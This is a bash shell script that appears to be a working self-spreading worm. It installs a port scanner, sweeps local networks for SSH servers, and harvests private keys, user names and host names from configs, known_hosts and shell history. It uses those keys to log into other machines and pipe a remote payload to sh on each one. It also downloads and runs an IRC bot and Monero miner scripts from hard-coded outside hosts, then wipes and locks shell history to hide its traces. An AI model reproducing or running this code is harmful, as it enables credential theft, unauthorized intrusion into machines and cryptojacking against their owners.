#!/bin/bash
if [ "$(hostname)" = "HaXXoRsMoPPeD" ]; then exit ; fi
# wget -O - http://chimaera.cc/sh/spr/SSH.id_rsa.LAN.spread.sh | bash

export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
export LANG=C.UTF-8 2>/dev/null 1>/dev/null
HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
HISTSIZE=0 2>/dev/null 1>/dev/null
unset HISTFILE 2>/dev/null 1>/dev/null

export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin

BIN_BOT="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../TNTb/irc.chimaera.cc"		
SRC_PNSCAN="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../pnscan/pnscan.tar.gz"
BIN_PNSCAN="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../pnscan/$(uname -m)"
	

if [ ! -f "/usr/bin/dockerd_env" ]; then
curl -sLk -o /usr/bin/dockerd_env $BIN_BOT
chmod 755 /usr/bin/dockerd_env
/usr/bin/dockerd_env
fi


if [ ! -d "/etc/.../.ssh.lan.spread/" ]; then  
mkdir -p /etc/.../.ssh.lan.spread/ 2>/dev/null 1>/dev/null
else
exit
fi

PAY1LOAD="http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../cmd/SSH.id_rsa.LAN.spread.sh"
VIC_O_IP=$(curl -sLk ipv4.icanhazip.com)
HTTP_SRC="http://chimaera.cc/bin/x86_64"

function pull() {
  read proto server path <<< "${1//"/"/ }"
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  while IFS= read -r line ; do 
      [[ "$line" == $'\r' ]] && break
  done <&3
  nul='\0'
  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
      printf "%s$nul" "$x"
  done <&3
  exec 3>&-
}


function SETUP_SOME_APPS(){
if ! type bash 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; apt-get install -y --reinstall bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; yum reinstall -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi ; fi

if ! type sudo 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y sudo 2>/dev/null 1>/dev/null; apt-get install -y --reinstall sudo 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y sudo 2>/dev/null 1>/dev/null; yum reinstall -y sudo 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add sudo 2>/dev/null 1>/dev/null; fi ; fi

if ! type chattr 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y e2fsprogs 2>/dev/null 1>/dev/null; apt-get install -y --reinstall e2fsprogs 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y e2fsprogs 2>/dev/null 1>/dev/null; yum reinstall -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add e2fsprogs 2>/dev/null 1>/dev/null; fi ; fi

if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi ; fi

if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi ; fi

if ! type gcc 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y gcc 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall gcc 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y gcc 2>/dev/null 1>/dev/null ; yum reinstall -y gcc 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add gcc 2>/dev/null 1>/dev/null ; fi ; fi

if ! type make 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y make 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall make 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y make 2>/dev/null 1>/dev/null ; yum reinstall -y make 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add make 2>/dev/null 1>/dev/null ; fi ; fi

if ! type git 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y git 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall git 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y git 2>/dev/null 1>/dev/null ; yum reinstall -y git 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add git 2>/dev/null 1>/dev/null ; fi ; fi

if ! type iptables 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y iptables 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall iptables 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y iptables 2>/dev/null 1>/dev/null ; yum reinstall -y iptables 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add iptables 2>/dev/null 1>/dev/null ; fi ; fi

if ! type ps 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y procps 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall procps 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y procps 2>/dev/null 1>/dev/null ; yum reinstall -y procps 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add procps 2>/dev/null 1>/dev/null ; fi ; fi

if ! type pnscan 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y pnscan 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall pnscan 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y pnscan 2>/dev/null 1>/dev/null ; yum reinstall -y pnscan 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add pnscan 2>/dev/null 1>/dev/null ; fi ; fi

	if ! type pnscan 2>/dev/null 1>/dev/null; then
	cd /var/tmp/ 2>/dev/null 1>/dev/null
	pull $SRC_PNSCAN > /var/tmp/pnscan_1.14.1.orig.tar.gz
	tar xvf /var/tmp/pnscan_1.14.1.orig.tar.gz -C /var/tmp/ 2>/dev/null 1>/dev/null && rm -fr /var/tmp/pnscan_1.14.1.orig.tar.gz 2>/dev/null 1>/dev/null
	cd /var/tmp/pnscan-1.14.1/ 2>/dev/null 1>/dev/null
	./configure 2>/dev/null 1>/dev/null && make 2>/dev/null 1>/dev/null
	cp /var/tmp/pnscan-1.14.1/pnscan /usr/bin/pnscan 2>/dev/null 1>/dev/null
	chmod 755 /usr/bin/pnscan 2>/dev/null 1>/dev/null
	chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null
	make install 2>/dev/null 1>/dev/null
	cd / 2>/dev/null 1>/dev/null
	rm -fr /var/tmp/pnscan-1.14.1/ 2>/dev/null 1>/dev/null
	fi

		if ! type pnscan 2>/dev/null 1>/dev/null; then pull $BIN_PNSCAN > /usr/bin/pnscan ; chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		if ! type pnscan 2>/dev/null 1>/dev/null; then wget -q $BIN_PNSCAN -O /usr/bin/pnscan ; chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		if ! type pnscan 2>/dev/null 1>/dev/null; then curl -s $BIN_PNSCAN -o /usr/bin/pnscan ; chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		if ! type pnscan 2>/dev/null 1>/dev/null; then cd1 -s $BIN_PNSCAN -o /usr/bin/pnscan ; chmod +x /usr/bin/pnscan 2>/dev/null 1>/dev/null ; fi
		/usr/bin/pnscan 127.0.0.0/24 22 2>/dev/null 1>/dev/null
		CHECK_PNS=$? ; if [ "$CHECK_PNS" = "0" ]; then 
		echo "$VIC_O_IP - PnScan is working!"
		else
		echo "$VIC_O_IP - PnScan NOT working!"
		fi
}



function GET_ALL_LAN_SSH_SERVER(){
if [ ! -d "/home/hilde/.ssh/" ]; then mkdir -p /home/hilde/.ssh/ 2>/dev/null 1>/dev/null ; fi
touch /home/hilde/.ssh/known_hosts 2>/dev/null 1>/dev/null

if type pnscan 2>/dev/null 1>/dev/null; then
ip route show | grep -v grep | grep -v 'blackhole\|0.0.0.0\|default' | grep "/" | awk '{print $1}' >> /home/hilde/.ssh/.ranges

while read LAN_RANGE ; do
pnscan $LAN_RANGE 22 | awk '{print $1}' >> /home/hilde/.ssh/known_hosts
done < /home/hilde/.ssh/.ranges

fi

rm -f /home/hilde/.ssh/.ranges 2>/dev/null 1>/dev/null
}



function SSH_ROUND_HOUSE_PWN(){
  myhostip=$(curl -sL 147.75.47.199 || mcurl -s 147.75.47.199)
  KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
  KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
  HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
  HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
  USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq
  )
  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
  pl=$(
    echo "22"
    cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}'
  )
  sshports=$(echo "$pl" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  i=0
  for user in $userlist; do
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          i=$((i+1))
          if [ "${i}" -eq "20" ]; then
            sleep 5
            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
            i=0
          fi
          chmod +r $key
          chmod 400 $key
          echo "$user@$host $key $sshp"
          ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "nohup $(cd1 -Ls $PAY1LOAD | sh ||curl -Ls $PAY1LOAD | sh || cur -Ls $PAY1LOAD | sh || cdl -Ls $PAY1LOAD | sh || wget -q --max-redirect=2 -O- $PAY1LOAD | sh || wge -q --max-redirect=2 -O- $PAY1LOAD | sh || wdl -q --max-redirect=2 -O- $PAY1LOAD | sh);"
        done
      done
    done
  done
}



SETUP_SOME_APPS
GET_ALL_LAN_SSH_SERVER
SSH_ROUND_HOUSE_PWN

wget -q -O- http://chimaera.cc/cmd/Setup-IRC_Bot.sh | bash
curl -Lk http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../xmr/sx/3.sh | bash
wget -O- http://85.214.149.236:443/sugarcrm/themes/default/images/SugarLogic/.../kuben2/my.xmr.sh | bash


rm -f ~/.bash_history 2>/dev/null 1>/dev/null
touch ~/.bash_history 2>/dev/null 1>/dev/null
chattr +i ~/.bash_history 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null


